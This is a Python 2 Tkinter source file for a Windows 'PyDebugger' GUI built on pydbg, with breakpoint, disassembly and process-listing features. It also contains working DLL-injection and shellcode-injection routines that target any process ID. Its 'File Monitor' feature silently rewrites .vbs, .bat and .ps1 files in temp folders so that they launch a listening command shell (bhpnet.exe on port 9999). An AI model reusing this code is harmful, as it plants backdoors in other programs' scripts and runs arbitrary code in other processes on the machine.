# encoding=utf8
# Lots of imports for everything #
import os
from ScrolledText import *
import tkFileDialog
import tkMessageBox
from Tkinter import *
from ttk import Frame, Button, Label, Style
global file, file2
from debuggerDefines import *
from ctypes import *
import ctypes
import Queue
import threading
import ast
import win32clipboard
from cStringIO import StringIO
import sys
# Import my debugger library
from pydbg import *
from pydbg.defines import *
import struct
import pydasm
import pefile
import time
import distorm3
import re
import debuggerUtilities as utils
import win32con
import win32api
import win32security
import win32file
import wmi
import pythoncom
import tempfile
import binascii
import psutil
time2 = .00015
# Initialize some constants for Windows functions and my debugger
dbg = pydbg()
kernel32 = windll.kernel32
# List of words to search for when coloring text
highlightWords = {'0x1 ': 'red',
                  '[0x1-> EXCEPTION_DEBUG_EVENT]': 'red',
                  '0x2 ': 'purple',
                  '[0x2-> CREATE_THREAD_DEBUG_EVENT]': 'purple',
                  '0x3 ': 'blue',
                  '[0x3-> CREATE_PROCESS_DEBUG_EVENT]': 'blue',
                  '0x4 ': 'orange',
                  '[0x4-> EXIT_THREAD_DEBUG_EVENT]': 'orange',
                  '0x5 ': 'red',
                  '[0x5-> EXIT_PROCESS_DEBUG_EVENT]': 'red',
                  '0x6 ': 'blue',
                  'DLL Loaded': 'blue',
                  '[0x6-> LOAD_DLL_DEBUG_EVENT]':'blue',
                  '0x7 ': 'orange',
                  '[0x7-> UNLOAD_DLL_DEBUG_EVENT]': 'orange',
                  '0x8 ': 'green',
                  '[0x8-> OUTPUT_DEBUG_STRING_EVENT]': 'green',
                  '0x9 ': 'red',
                  '[0x9-> RIP_EVENT]':'red',
                  'Access Violation Detected.': 'red',
                  'Event:': 'blue',
                  'CreateFileW': 'red',
                  'CreateFileA': 'blue',
                  '[-]': 'red',
                  '[+]': 'blue',
                  '[*]': 'green',
                  '[**]': 'green',
                  'PID:': 'blue'
                  }

class Example(Frame):
    
    def __init__(self, parent):# Initilize the GUI
        Frame.__init__(self, parent)
        self.parent = parent
        self.initUI()
        self.h_process       =     None
        self.pid             =     None
        self.debugger_active =     False
        self.h_thread        =     None
        self.context         =     None
        self.breakpoints     =     {}
        self.first_breakpoint=     True
        self.hardware_breakpoints = {}
        
        # Here let's determine and store 
        # the default page size for the system
        # determine the system page size.
        system_info = SYSTEM_INFO()
        kernel32.GetSystemInfo(byref(system_info))
        self.page_size = system_info.dwPageSize
        
        # TODO: test
        self.guarded_pages      = []
        self.memory_breakpoints = {}
        
        self.OPENSTATE = False
        self.libModeState = False
        self.crashModeState = False
        self.PYDBG = False
        self.counter = 0
        self.att = False

    def initUI(self):# More GUI stuff
        self.diss = False
        self.OPEN = None
        self.PID = None
        self.nocolor = False
        self.crash = False
        self.CheckRun = True
        self.BreakFunk = 1
        self.breakmode = False
        self.pause = False
        self.pauseModeVar = False
        self.coloring = True
        self.hide2 = False
        # Titles and stuff
        self.parent.title("Python Debugger")
        self.style = Style()
        self.style.theme_use("default")
        self.pack(fill=BOTH, expand=1)

        self.columnconfigure(1, weight=1)
        self.columnconfigure(3, pad=7)
        self.rowconfigure(3, weight=1)
        self.rowconfigure(5, pad=7)

        lbl = Label(self, text="Debugger:")
        lbl.grid(sticky=W, pady=4, padx=5)

        #lbl = Label(self, text="Average Grade:")
        #lbl.grid(row=3, column=3, pady=5)

        self.textPad = ScrolledText(self)
        self.textPad.grid(row=1, column=0, columnspan=2, rowspan=4, padx=5, sticky=E+W+S+N)
        # Buttons
        abtn = Button(self, text="      Start       ",command=self.start)
        abtn.grid(row=1, column=3)

        cbtn = Button(self, text="Register Info",command=self.popupTHREAD)
        cbtn.grid(row=2, column=3, pady=4)
        cbtn = Button(self, text="Detach",command=self.detach2)
        #cbtn.place(x=381, y=85)
        cbtn.grid(row=3, column=3, pady=4, padx=10)

        hbtn = Button(self, text="Help", command=self.about_command)
        hbtn.grid(row=5, column=0, padx=5)

        obtn = Button(self, text="Close",command=self.onExit )
        obtn.grid(row=5, column=3)        

        menubar = Menu(self.parent)
        self.parent.config(menu=menubar)

        fileMenu = Menu(menubar)       
        # Menu bar stuff
        submenu = Menu(fileMenu)
        submenu2 = Menu(fileMenu)
        dbgMenu = Menu(fileMenu)
        injmenu = Menu(fileMenu)
        monmenu = Menu(fileMenu)
        dbgMenu.add_cascade(label='Engine Modes', menu=submenu, underline=0)
        dbgMenu.add_command(label="Show Event Codes", command=self.popupEVENT1)
        submenu.add_command(label="Use Defualt Debug Engine", command=self.defualt)
        submenu.add_command(label="Crash Mode(Special Engine)", command=self.crashMode)
        submenu.add_command(label="Created Files Mode(Special Engine)", command=self.libMode)
        dbgMenu.add_command(label="Hide Debugger", command=self.hide)
        dbgMenu.add_command(label="Change Registers", command=self.change)

        breakpointMenu = Menu(fileMenu)
        breakpointMenu.add_command(label="Show Breakpoints", command=self.showBreakpoints)
        breakpointMenu.add_command(label="Pause at Breakpoints", command=self.pauseMode)
        breakpointMenu.add_cascade(label="When a breakpoint is hit ", menu=submenu2, underline=0)
        submenu2.add_command(label="Say 'Breakpoint Hit'", command=lambda: self.deal(1))
        submenu2.add_command(label="SEH Unwind", command=lambda: self.deal(2))
        submenu2.add_command(label="Stack Unwind", command=lambda: self.deal(3))
        submenu2.add_command(label="Disassem Around", command=lambda: self.deal(4))
        submenu2.add_command(label="All of the above + extra :)", command=lambda: self.deal(5))

        injmenu.add_command(label="Inject dll", command=self.popupDLL2)
        injmenu.add_command(label="Inject shellcode", command=self.code_inject)

        monmenu.add_command(label="File Monitor", command=self.file_mon)
        monmenu.add_command(label="Process Monitoer", command=self.proc_mon)
        monmenu.add_command(label="List running procesess", command=self.procesess_list2)
        
        optionsMenu = Menu(fileMenu)
        optionsMenu.add_command(label="Export", command=self.export)
        optionsMenu.add_command(label="Clear", command=self.clear)
        optionsMenu.add_command(label="Colors off", command=self.off)

        dismenu = Menu(fileMenu)
        dismenu.add_command(label="Dissasemble", command=self.disassemble3)
        dismenu.add_command(label="Dissasemble Around", command=self.diss_around)
        dismenu.add_command(label="Show hex", command=self.show_hex)

        editMenu = Menu(fileMenu)
        editMenu.add_command(label="Find", command=self.find_action)
        
        fileMenu.add_command(label="Attach", command=self.popupPID)
        fileMenu.add_command(label="Open", command=self.popupOPEN2)
        fileMenu.add_separator()
        fileMenu.add_command(label="Exit", underline=0, command=self.onExit)

        menubar.add_cascade(label="File", underline=0, menu=fileMenu)
        menubar.add_cascade(label="Edit", underline=0, menu=editMenu)
        menubar.add_cascade(label="Debug", underline=0, menu=dbgMenu)
        menubar.add_cascade(label="Breakpoints", underline=0, menu=breakpointMenu)
        menubar.add_cascade(label="Disassembly", underline=0, menu=dismenu)
        menubar.add_cascade(label="Injection", underline=0, menu=injmenu)
        menubar.add_cascade(label="Monitoring", underline=0, menu=monmenu)
        menubar.add_cascade(label="Options", underline=0, menu=optionsMenu)
        line = "Welcome to the PyDebugger version 3.1"
        self.print2(line)
        self.rClickbinder(self.textPad)
        self.textPad.bind("<Key>", self.highlighter)

    def print2(self, line):
        print line
        try:
            line.strip("\n")
            line = "{}\n".format(line)
            #line = "" + line
        except:
            pass   #Probably a list 
        self.textPad.insert('1.0', line)
        self.highlighter(1)
        time.sleep(time2)

    def highlighter(self, r):
        if not self.coloring:
            return False
        for k,v in highlightWords.iteritems(): # iterate over dict
            startIndex = '1.0'
            try:
                while True:
                    startIndex = self.textPad.search(k, startIndex, END) # search for occurence of k
                    if startIndex:
                        endIndex = self.textPad.index('%s+%dc' % (startIndex, (len(k)))) # find end of k
                        self.textPad.tag_add(k, startIndex, endIndex) # add tag to k
                        self.textPad.tag_config(k, foreground=v)      # and color it with v
                        startIndex = endIndex # reset startIndex to continue searching
                    else:
                        break
            except:
                pass
        return True

    def diss_around(self):
        if self.PID == self.OPEN:
            self.print2("[-] For dissasembly around an address, you must be runing it...")
            return False
        self.w=popupWindowDISS(self.master)
        self.master.wait_window(self.w.top)
        address = self.w.value
        line = dbg.disasm_around(address)
        self.print2(line)

    def show_hex(self):
        self.blocksize = 1024
        if self.OPEN == None:
            self.print2("[-] You must open an executable first.")
            return False
        self.w=popupWindowHEX(self.master)
        self.master.wait_window(self.w.top)
        self.print2("[*] Converting...")
        t = threading.Thread(target=self.show_hex2)
        t.daemon = True
        t.start()

    def show_hex2(self):
        offset = 0
        with open(self.OPEN,"rb") as f:
            block = f.read(self.blocksize)
            str = ""
            for ch in block:
                    str += hex(ord(ch))+" "
            self.print2(str)
        
    def show_hex22(self):
        with open(self.OPEN, 'rb') as f:
            content = f.read()
            self.print2(binascii.hexlify(content))
            #self.print2(' '.join([str(ord(a)) for a in content]))

    def change(self):
        self.w=popupWindowCHANGE(self.master)
        self.master.wait_window(self.w.top)

    def hide(self):
        self.print2("[-] Warning, This only works with attaching, not opening-May cause errors.")
        self.print2("[*] Debugger will hide it's self after the first breakpoint, you will get a message.")
        self.hide2 = True
    
    def popupDLL2(self):
        print "Dll Injection only works for same bit process(ie. 32-32 bit or 64-64 bit), trying to inject into a different bit process will produve an error"
        #self.w=popupWindowDLL(self.master)
        #self.master.wait_window(self.w.top)
        #self.DLL = self.w.value
        self.DLL = tkFileDialog.askopenfile(mode='r',title='Select a dll',filetypes=[("Dynamic Libraries", "*.dll")] )
        self.DLL = self.DLL.name.strip()
        print self.DLL
        self.w=popupWindowDLL2(self.master)
        self.master.wait_window(self.w.top)
        self.DLLPID = int(self.w.value)
        if self.DLLPID == "":
            if self.PID:
                self.DLLPID = self.PID
            else:
                label = tkMessageBox.showinfo("Error", "You must attach or input a pid to inject a dll")
        kernel32 = windll.kernel32
        PID = int(self.DLLPID)
        DLL_PATH = str(self.DLL)
        print "Dll path =%s=" % DLL_PATH
        PAGE_RW_PRIV = 0x04
        PROCESS_ALL_ACCESS = 0x1F0FFF
        VIRTUAL_MEM = 0x3000
        self.print2( "[+] Starting DLL Injector")
        LEN_DLL = len(self.DLL)# get the length of the DLL PATH 
        self.print2( "[+] Getting process handle for PID:%d " % PID)
        hProcess = kernel32.OpenProcess(PROCESS_ALL_ACCESS,False,PID)
     
        if hProcess is None:
            self.print2( "[+] Unable to get process handle")
            return False
        self.print2( "[+] Allocating space for DLL PATH")
        DLL_PATH_ADDR = kernel32.VirtualAllocEx(hProcess, 
                                                0,
                                                LEN_DLL,
                                                VIRTUAL_MEM,
                                                PAGE_RW_PRIV)
        bool_Written = c_int(0)
        self.print2( "|--[+] Writing DLL PATH to current process space")
        kernel32.WriteProcessMemory(hProcess,
                                    DLL_PATH_ADDR,
                                    DLL_PATH,
                                    LEN_DLL,
                                    byref(bool_Written))
        self.print2( "[+] Resolving Call Specific functions & libraries")
        kernel32DllHandler_addr = kernel32.GetModuleHandleA("kernel32")
        self.print2( "|--[+] Resolved kernel32 library at 0x%08x" % kernel32DllHandler_addr)
        LoadLibraryA_func_addr = kernel32.GetProcAddress(kernel32DllHandler_addr,"LoadLibraryA")
        self.print2( "  |--[+] Resolve LoadLibraryA function at 0x%08x" %LoadLibraryA_func_addr)
        thread_id = c_ulong(0) # for our thread id
        self.print2( "[+] Creating Remote Thread to load our DLL")
        if not kernel32.CreateRemoteThread(hProcess,
                                    None,
                                    0,
                                    LoadLibraryA_func_addr,
                                    DLL_PATH_ADDR,
                                    0,
                                    byref(thread_id)):
            line = kernel32.GetLastError()
            self.print2( "[-] Injection Failed, exiting with error code:%s" % line)
            return False
        else:
            line = kernel32.GetLastError()
            self.print2( "|--[+] Remote Thread 0x%08x created, DLL code injected with code:%s" % (thread_id.value, line))
            
    def find_action(self):
            t2 = self.top = Toplevel(self)
            #t2 = tk.Toplevel(root)
            t2.title('Find Text')
            t2.geometry('280x80')
            # Make sure the window is drawn on top of the root window with transient
            t2.transient(self)
            Label(t2, text='Find All:').grid(row=0, column=0, sticky='e')
            v = StringVar()
            search_phrase_box = Entry(t2, width=25, textvariable=v)
            search_phrase_box.grid(row=0, column=1, padx=2, sticky='we')
            # Shift the cursor's focus to the new Entry widget
            search_phrase_box.focus_set()

            c = IntVar()
            Checkbutton(t2, text='Ignore Case', variable=c).grid(row=1, column=1,
				   sticky='e', padx=2, pady=2)
            Button(t2, text='Find All', underline=0, command=lambda: self.search_for(v.get(), 
			  c.get(), self.textPad, t2, search_phrase_box)).grid(
			  row=0, column=2, sticky='e'+'w', padx=2, pady=2)
            def close_search():
                textPad.tag_remove('match', '1.0', END)
                t2.destroy()
                # Override the close button
                t2.protocol('WM_DELETE_WINDOW', close_search)

    def search_for(self,needle,cssnstv, textPad, t2,e) :
            self.textPad.tag_remove('match', '1.0', END)
            count =0
            if needle:
                    position = '1.0'
                    while True:
                        position = self.textPad.search(needle, position, nocase=cssnstv, stopindex=END)
                        if not position: break
                        lastposition = '%s+%dc' % (position, len(needle))
                        self.textPad.tag_add('match', position, lastposition)
                        count += 1
                        position = lastposition
                    self.textPad.tag_config('match', foreground='yellow', background='#019875')
            self.textPad.focus_set()
            t2.title('%d found' % count)
            
    def procesess_list(self):
        self.clear()
        self.print2("[+] Getting Process List...")
        for (pid, name) in dbg.enumerate_processes():
            if (pid != os.getpid()):
                self.print2("[+] Name:%s PID:%s" % (name, pid))
            else:
                self.print2("[+] Name:%s PID:%s     <==[Current Debugger Process] " % (name, pid))

    def procesess_list2(self):
        self.print2("[+] Getting Process List...")
        self.procesess_list()
        

    def code_inject(self):
        print "[-] Code Injection only works for same bit process(ie. 32-32 bit or 64-64 bit), trying to inject into a different bit process will produve an error"
        self.w=popupWindowINJECT(self.master)
        self.master.wait_window(self.w.top)
        self.shellcode = self.w.value.strip().strip("\n").strip("\r")
        self.w=popupWindowDLL2(self.master)
        self.master.wait_window(self.w.top)
        self.PID = int(self.w.value)
        page_rwx_value = 0x40
        process_all = 0x1F0FFF
        memcommit = 0x00001000
        kernel32_variable = windll.kernel32
        shellcode_length = len(self.shellcode)
        self.print2("[*] Shellcode length:%s" % shellcode_length)
        self.print2("[+] Attaching to process")
        process_handle = kernel32_variable.OpenProcess(process_all, False, self.PID)
        if process_handle is None:
            self.print2( "[-] Unable to get process handle")
            return False
        memory_allocation_variable = kernel32_variable.VirtualAllocEx(process_handle, 0, shellcode_length, memcommit, page_rwx_value)
        kernel32_variable.WriteProcessMemory(process_handle, memory_allocation_variable, self.shellcode, shellcode_length, 0)
        self.print2("|--[+] Creating remote thread")
        kernel32_variable.CreateRemoteThread(process_handle, None, 0, memory_allocation_variable, 0, 0, 0)
        self.print2("[+] Shellcode should be injected now") 

    

    def file_mon(self):
        self.w=popupWindowDIR(self.master)
        self.master.wait_window(self.w.top)
        self.DIR = self.w.value
        if self.DIR == "":
            dirs_to_monitor = ["C:\\WINDOWS\\Temp",tempfile.gettempdir()]
        else:
            dirs_to_monitor = ["C:\\WINDOWS\\Temp",tempfile.gettempdir(),self.DIR]
        # file modification constants
        FILE_CREATED      = 1
        FILE_DELETED      = 2
        FILE_MODIFIED     = 3
        FILE_RENAMED_FROM = 4
        FILE_RENAMED_TO   = 5

        # extension based code snippets to inject
        file_types         = {}
        command = "C:\\WINDOWS\\TEMP\\bhpnet.exe â€“l â€“p 9999 â€“c"
        file_types['.vbs'] = ["\r\n'bhpmarker\r\n","\r\nCreateObject(\"Wscript.Shell\").Run(\"%s\")\r\n" % command]
        file_types['.bat'] = ["\r\nREM bhpmarker\r\n","\r\n%s\r\n" % command]
        file_types['.ps1'] = ["\r\nbhpmarker","Start-Process \"%s\"" % command]
        for path in dirs_to_monitor:
            monitor_thread = threading.Thread(target=self.start_monitor,args=(path,))
            monitor_thread.daemon = True
            self.print2( "[+] Spawning monitoring thread for path: %s" % path)
            monitor_thread.start()

    def inject_code(self,full_filename,extension,contents):
    
    # is our marker already in the file?
        if file_types[extension][0] in contents:
            return
    # no marker let's inject the marker and code
        full_contents  = file_types[extension][0]
        full_contents += file_types[extension][1]
        full_contents += contents
        fd = open(full_filename,"wb")
        fd.write(full_contents)
        fd.close()
        self.print2( "[\o/] Injected code.")
        return
    
    def start_monitor(self,path_to_watch):
        # we create a thread for each monitoring run
        FILE_LIST_DIRECTORY = 0x0001
        FILE_CREATED      = 1
        FILE_DELETED      = 2
        FILE_MODIFIED     = 3
        FILE_RENAMED_FROM = 4
        FILE_RENAMED_TO   = 5
        file_types         = {}
        command = "C:\\WINDOWS\\TEMP\\bhpnet.exe â€“l â€“p 9999 â€“c"
        file_types['.vbs'] = ["\r\n'bhpmarker\r\n","\r\nCreateObject(\"Wscript.Shell\").Run(\"%s\")\r\n" % command]
        file_types['.bat'] = ["\r\nREM bhpmarker\r\n","\r\n%s\r\n" % command]
        file_types['.ps1'] = ["\r\nbhpmarker","Start-Process \"%s\"" % command]

        h_directory = win32file.CreateFile(
            path_to_watch,
            FILE_LIST_DIRECTORY,
            win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE | win32con.FILE_SHARE_DELETE,
            None,
            win32con.OPEN_EXISTING,
            win32con.FILE_FLAG_BACKUP_SEMANTICS,
            None)
        while 1:
            try:
                results = win32file.ReadDirectoryChangesW(
                    h_directory,
                    1024,
                    True,
                    win32con.FILE_NOTIFY_CHANGE_FILE_NAME |
                    win32con.FILE_NOTIFY_CHANGE_DIR_NAME |
                    win32con.FILE_NOTIFY_CHANGE_ATTRIBUTES |
                    win32con.FILE_NOTIFY_CHANGE_SIZE |
                    win32con.FILE_NOTIFY_CHANGE_LAST_WRITE |
                    win32con.FILE_NOTIFY_CHANGE_SECURITY,
                    None,
                    None
                    )
                for action,file_name in results:
                    full_filename = os.path.join(path_to_watch, file_name)
                    if action == FILE_CREATED:
                        line = ("[+] Created %s" % full_filename)
                        self.print2(line)
                    elif action == FILE_DELETED:
                        line = ("[-] Deleted %s" % full_filename)
                        self.print2(line)
                    elif action == FILE_MODIFIED:
                        line = ("[*] Modified %s" % full_filename)
                        self.print2(line)
                    # dump out the file contents
                        line = ("[vvv] Dumping contents...")
                        self.print2(line)
                        try:
                            fd = open(full_filename,"rb")
                            contents = fd.read()
                            fd.close()
                            self.print2( contents)
                            line = ("[^^^] Dump complete.")
                            self.print2(line)
                        except:
                            line = ("[!!!] Failed.")
                            self.print2(line)
                    
                        filename,extension = os.path.splitext(full_filename)
                    
                        if extension in file_types:
                            self.inject_code(full_filename,extension,contents)
                    
                    elif action == FILE_RENAMED_FROM:
                        line = ("[>] Renamed from: %s" % full_filename)
                        self.print2(line)
                    elif action == FILE_RENAMED_TO:
                        line = ("[<] Renamed to: %s" % full_filename)
                        self.print2(line)
                    else:
                        line = ("[?] Unknown: %s" % full_filename)
                        self.print2(line)
            except:
                pass

    def proc_mon(self):
        self.print2("[+] Starting process monitor")
        t = threading.Thread(target=self.proc_mon2)
        t.daemon = True
        t.start()

    def get_process_privileges(self, pid):
        try:
        # obtain a handle to the target process
            hproc = win32api.OpenProcess(win32con.PROCESS_QUERY_INFORMATION, False, pid)

        # open the main process token
            htok = win32security.OpenProcessToken(hproc, win32con.TOKEN_QUERY)

        # retrieve the list of privileges enabled
            privs = win32security.GetTokenInformation(htok, win32security.TokenPrivileges)

        # iterate over privileges and output the ones that are enabled
            priv_list = []
            for priv_id, priv_flags in privs:
                # check if the privilege is enabled
                if priv_flags == 3:
                    priv_list.append(win32security.LookupPrivilegeName(None, priv_id))
        except:
            priv_list.append("N/A")
        return "|".join(priv_list)

    def proc_mon2(self):
        pythoncom.CoInitialize()
        c = wmi.WMI()
        process_watcher = c.Win32_Process.watch_for("creation")
        while True:
            try:
                new_process = process_watcher()

                proc_owner  = new_process.GetOwner()
                proc_owner  = "%s\\%s" % (proc_owner[0],proc_owner[2])
                create_date = new_process.CreationDate
                executable  = new_process.ExecutablePath
                cmdline     = new_process.CommandLine
                pid         = new_process.ProcessId
                parent_pid  = new_process.ParentProcessId

                privileges  = self.get_process_privileges(pid)

                process_log_message = "\n[+] Date: %s,\n[+] Process Owner:%s,\n[+] Executable:%s,\n[+] Cmd line opts:%s,\n[+] PID:%s,\n[+] Parent PID:%s,\n[+] Privs:%s" % (create_date, proc_owner, executable, cmdline, pid, parent_pid,privileges)

                self.print2( "%s\r\n" % process_log_message)
            except:
                pass

    def dummy(self):
        self.print2("Not ready yet...")

    def disassem(self, dbg):
        self.print2("[+]Hit a breakpoint at %s" % dbg.exception_address)
        line = dbg.disasm_around(dbg.exception_address)
        synop = "\nDissasembled around breakpoint instruction\n"
        for (ea, inst) in line:
            synop += "\t0x%08x %s\n" % (ea, inst)
        self.print2(synop)
        self.wait()
        return DBG_CONTINUE

    def pauseMode(self):
        self.pauseModeVar = True
        self.print2("[*]Will pause at breakpoints")

    def deal(self, num):
        self.BreakFunk = num
        return True

    def wait(self):
        if self.pauseModeVar:
            self.breakmode = True
            self.pause = True
            fill = 1
            while self.pause:
                fill = fill + 1 - 1
            self.print2("[*] Continuing")

    def SEH_unwind(self, dbg):
        self.print2("[+]Hit a breakpoint at %s" % dbg.exception_address)
        #self.print2("[+]SEH Chain")
        line = dbg.seh_unwind()
        synopsis = "\n[+]SEH Chain\n"
        for (addr, handler_str) in line:
            synopsis +=  "\t%08x -> %s\n" % (addr, handler_str)
        self.print2(synopsis)
        self.wait()
        return DBG_CONTINUE

    def dump_info(self, dbg):
        self.print2("[+]Hit a breakpoint at %s" % dbg.exception_address)
        info = dbg.stack_unwind()
        synop1 = "\nStack Unwind\n"
        for entry in info:
                synop1 += "\t%s\n" % entry
        self.print2(synop1)
        self.wait()
        return DBG_CONTINUE

    def all_info(self, dbg):
        self.print2("[+]Hit a breakpoint at %s" % dbg.exception_address)
        #self.print2("[+]SEH Chain")
        line = dbg.seh_unwind()
        synopsis = "\n[+]SEH Chain\n"
        for (addr, handler_str) in line:
            synopsis +=  "\t%08x -> %s\n" % (addr, handler_str)
        self.print2(synopsis)
        info = dbg.stack_unwind()
        synop1 = "\nStack Unwind\n"
        for entry in info:
                synop1 += "\t%s\n" % entry
        self.print2(synop1)
        line = dbg.disasm_around(dbg.exception_address)
        synop = "\nDissasembled around breakpoint instruction\n"
        for (ea, inst) in line:
            synop += "\t0x%08x %s\n" % (ea, inst)
        self.print2(synop)
        i = 0;
        for thread_id in dbg.enumerate_threads():
            thread_handle  = dbg.open_thread(thread_id)
            context = dbg.get_thread_context(thread_handle)
            self.print2("[*] Dumping registers for threads:")
            self.print2("[**] Thread ID:%03d: %08x EIP: %08x" % (i,thread_handle,context.Eip))
            self.print2("[**] Thread ID:%03d:: %08x ESP: %08x" % (i,thread_handle,context.Esp))
            self.print2("[**] Thread ID:%03d:: %08x EBP: %08x" % (i,thread_handle,context.Ebp))
            self.print2("[**] Thread ID:%03d:: %08x EAX: %08x" % (i,thread_handle,context.Eax))
            self.print2("[**] Thread ID:%03d:: %08x EBX: %08x" % (i,thread_handle,context.Ebx))
            self.print2("[**] Thread ID:%03d:: %08x ECX: %08x" % (i,thread_handle,context.Ecx))
            self.print2("[**] Thread ID:%03d:: %08x EDX: %08x" % (i,thread_handle,context.Edx))
            self.print2("[**] Thread ID:%03d:: %08x EDI: %08x" % (i,thread_handle,context.Edi))
            self.print2("[**] Thread ID:%03d:: %08x ESI: %08x" % (i,thread_handle,context.Esi))
            i += 1
        self.wait()
        return DBG_CONTINUE

    def showBreakpoints(self):
        try:
            file = open("Breakpoints.txt", "r")
        except:
            self.print2("Could not find Breakpoints.txt, no breakpoint setting...")
            pass
        for line in file.readlines():
            line = re.sub("[^\w]", " ",  line).split()
            self.print2("[*] Breakpoint on %s in %s." % (line[2], line[0] + "." + line[1]))

    def get_dlls(self):
        for modules in pydbg().enumerate_modules():
            if self.CheckRun:
                self.print2("[*] Executable > %s" % modules[0])
                self.CheckRun = False
            else:
                self.print2("[+] DLL Loaded(%s) > %s" % (modules[1],modules[0]))
            time.sleep(.005)

    def handler_breakpoint(self, dbg):
        self.print2("[+] Hit a breakpoint")
        print dbg
        return DBG_CONTINUE

    def InitPyDBG(self):
        def one(dbg):
            self.print2("[0x1-> EXCEPTION_DEBUG_EVENT]")
            return DBG_CONTINUE
        def two(dbg):
            self.print2("[0x2-> CREATE_THREAD_DEBUG_EVENT]")
            return DBG_CONTINUE
        def three(dbg):
            self.print2("[0x3-> CREATE_PROCESS_DEBUG_EVENT]")
            return DBG_CONTINUE
        def four(dbg):
            self.print2("[0x4-> EXIT_THREAD_DEBUG_EVENT]")
            return DBG_CONTINUE
        def five(dbg):
            self.print2("[0x5-> EXIT_PROCESS_DEBUG_EVENT]")
            return DBG_CONTINUE
        def six(dbg):
            last_dll = dbg.get_system_dll(-1)
            self.print2("[0x6-> LOAD_DLL_DEBUG_EVENT] > 0x%08x %s" % (last_dll.base, last_dll.path))
            return DBG_CONTINUE
        def seven(dbg):
            self.print2("[0x7-> UNLOAD_DLL_DEBUG_EVENT]")
            return DBG_CONTINUE
        def eight(dbg):
            self.print2("[0x8-> OUTPUT_DEBUG_STRING_EVENT]")
            return DBG_CONTINUE
        def nine(dbg):
            self.print2("[0x9-> RIP_EVENT]")
            return DBG_CONTINUE
        dbg.set_callback(EXCEPTION_DEBUG_EVENT,one)
        dbg.set_callback(CREATE_THREAD_DEBUG_EVENT,two)
        dbg.set_callback(CREATE_PROCESS_DEBUG_EVENT,three)
        dbg.set_callback(EXIT_THREAD_DEBUG_EVENT,four)
        dbg.set_callback(EXIT_PROCESS_DEBUG_EVENT,five)
        dbg.set_callback(LOAD_DLL_DEBUG_EVENT,six)
        dbg.set_callback(UNLOAD_DLL_DEBUG_EVENT,seven)
        dbg.set_callback(OUTPUT_DEBUG_STRING_EVENT,eight)
        dbg.set_callback(RIP_EVENT,nine)

    def highlighter2(self):
        pass

    def off(self):
        self.coloring = False

    def single_step_handler(self, dbg):
        global instruction_count
        global crash_encountered
        if crash_encountered:
            if instruction_count == MAX_INSTRUCTIONS:
                dbg.single_step(False)
                return DBG_CONTINUE
            else:
# Disassemble this instruction
                instruction = dbg.disasm(dbg.context.Eip)
                self.print2( "#%d\t0x%08x : %s" % (instruction_count,dbg.context.Eip,
instruction))
                instruction_count += 1
                dbg.single_step(True)
            return DBG_CONTINUE

    def danger_handler(self, dbg):
        # We want to print out the contents of the stack; that's about it
        # Generally there are only going to be a few parameters, so we will
        # take everything from ESP to ESP+20, which should give us enough
        # information to determine if we own any of the data
        esp_offset = 0
        self.print2("[*] Hit %s" % dangerous_functions_resolved[dbg.context.Eip])
        self.print2( "=================================================================" )
        while esp_offset <= 20:
            parameter = dbg.smart_dereference(dbg.context.Esp + esp_offset)
            self.print2( "[ESP + %d] => %s" % (esp_offset, parameter))
            esp_offset += 4
        self.print2( "=================================================================" )
        dbg.suspend_all_threads()
        dbg.process_snapshot()
        dbg.resume_all_threads()
        self.highlighter(1)
        return DBG_CONTINUE

    def hide_bp(self, dbg):
        if dbg.first_breakpoint:
            dbg.hide_debugger()
            self.print2("[+] ========Debugger hidden!========")
        return DBG_CONTINUE

    def breakpointset(self, debugger):
        try:
            file = open("Breakpoints.txt", "r")
        except:
            self.print2("Could not find Breakpoints.txt, no breakpoint setting...")
            return False
        if self.hide2:
            dbg.set_callback(EXCEPTION_BREAKPOINT, self.hide_bp)
        for line in file.readlines():
            try:
                line = re.sub("[^\w]", " ",  line).split()
                if debugger == "pydbg":
                    func_address = dbg.func_resolve(line[0],line[2])
                    self.print2("Address of %s(%s) is: 0x%08x" % (line[2], line[0], func_address))
                    if self.BreakFunk == 1:
                        dbg.bp_set(func_address, description=line[2],handler=self.handler_breakpoint)
                    elif self.BreakFunk == 2:
                        self.print2("[*] Using 'SEH Unwind' handler")
                        dbg.bp_set(func_address, description=line[2],handler=self.SEH_unwind)
                    elif self.BreakFunk == 3:
                        self.print2("[*] Using 'Dump Heap Info' handler")
                        dbg.bp_set(func_address, description=line[2],handler=self.dump_info)
                    elif self.BreakFunk == 4:
                        self.print2("[*] Using 'Disassem Around' handler")
                        dbg.bp_set(func_address, description=line[2],handler=self.disassem)
                    elif self.BreakFunk == 5:
                        self.print2("[*] Using 'All info handler'")
                        dbg.bp_set(func_address, description=line[2],handler=self.all_info)
                    self.print2("Set Breakpoint on %s at address 0x%08x" % (line[2], func_address))
            except:
                self.print2("[-] Error setting breakpoint on %s(%s) at address 0x%08x" % (line[2], line[0], func_address))
        self.print2("[*] Done with breakpoints") 
            
            
    def print2(self, line):
        print line
        try:
            line.strip("\n")
            line = "{}\n".format(line)
            #line = "" + line
        except:
            pass   #Probably a list 
        self.textPad.insert('1.0', line)
        if self.nocolor:
            return True
        else:
            self.highlighter(1)
        time.sleep(time2)

    def print3(self, line):
        line.strip("\n")
        self.textPad.insert('1.0', line)
        self.highlighter(1)

    def crashMode(self):
        self.print2("[+] Enabling crash mode")
        self.crashModeState = True
        self.libModeState = False
        self.PYDBG = True

    def libMode(self):
        self.print2("[+] Enabling Created Files mode")
        self.libModeState = True
        self.crashModeState = False
        self.PYDBG = True

    def defualt(self):
        self.print2("[+] Using default mode")
        self.libModeState = False
        self.PYDBG = False
        self.crashModeState = False

    def disassemble3(self):
        label = tkMessageBox.showinfo("Info", "This will not print anything until it is done, so don't go anywhere! After its done hit Options then Export and it will send it to a file.")
        self.print2("This may take a while...")
        t = threading.Thread(target=self.disassemble2)
        t.daemon = True
        t.start()

    def disassemble2(self):
        if self.OPEN is None:
            self.print2("[-]Error: You must open an executable first")
            return False
        self.diss = True
        num_bytes = os.path.getsize(self.OPEN)
        dt = distorm3.Decode32Bits
        filename = self.OPEN
        offset   = 0
        length   = None
        try:
            code = open(filename, 'rb').read()
        except Exception as e:
            self.print2('Error reading file %s: %s' % (filename, e))
            return False
        old_stdout = sys.stdout
        sys.stdout = mystdout = StringIO()
        # Print each decoded instruction
        # This shows how to use the Deocode - Generator
        iterable = distorm3.DecodeGenerator(offset, code, dt)
        #for (offset, size, instruction, hexdump) in iterable:
        #    self.print2("%.8x: %-32s %s" % (offset, hexdump, instruction))
